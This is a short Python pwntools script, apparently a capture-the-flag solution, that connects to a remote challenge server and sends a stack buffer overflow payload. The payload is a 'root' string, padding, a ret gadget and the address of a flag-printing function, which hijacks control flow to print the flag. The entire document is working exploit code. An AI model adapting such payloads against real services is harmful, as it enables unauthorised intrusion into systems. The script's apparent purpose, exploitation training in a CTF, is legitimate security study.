from pwn import *

HOST = "sfide.itscybergame.it"
PORT = 17762

FLAG_PRINT = 0x401214
RET_GADGET = 0x4010c0

payload  = b"root\x00"
payload += b"A" * 103
payload += p64(0x0)
payload += p64(RET_GADGET)
payload += p64(FLAG_PRINT)

conn = remote(HOST, PORT)
conn.recvuntil(b"What's your name?\n")
conn.sendline(payload)
print(conn.recvall(timeout=3).decode(errors='replace'))
conn.close()
